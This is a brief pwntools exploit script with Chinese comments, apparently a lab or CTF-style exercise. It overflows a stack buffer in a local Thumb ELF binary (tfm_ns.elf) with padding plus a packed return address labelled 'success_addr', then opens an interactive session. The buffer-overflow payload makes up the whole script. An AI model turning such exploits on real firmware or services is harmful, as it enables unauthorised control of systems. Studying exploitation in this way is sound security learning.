#!/usr/bin/env python3

from pwn import*
import sys
import pdb
context.arch = 'thumb'
context.log_level='debug'#脚本在执行时就会输出debug的信息

io = process("./cmake_build/bin/tfm_ns.elf")#连接文件
#  p32() 可以让我们转换整数到小端序格式. p32 转换4字节
# 'a'* 0x3c是自行计算的偏移量（怎么算的）
success_addr = 0x080552D4
## 构造payload
payload = 'a' * 0x40 + 'bbbbbbbbbbbbbbbbbbbbbbbbbbbb' + p32(success_addr)
io.sendline(payload)
io.interactive()
#io.recvunti("Input password:\n")
#io.sendline("123456")
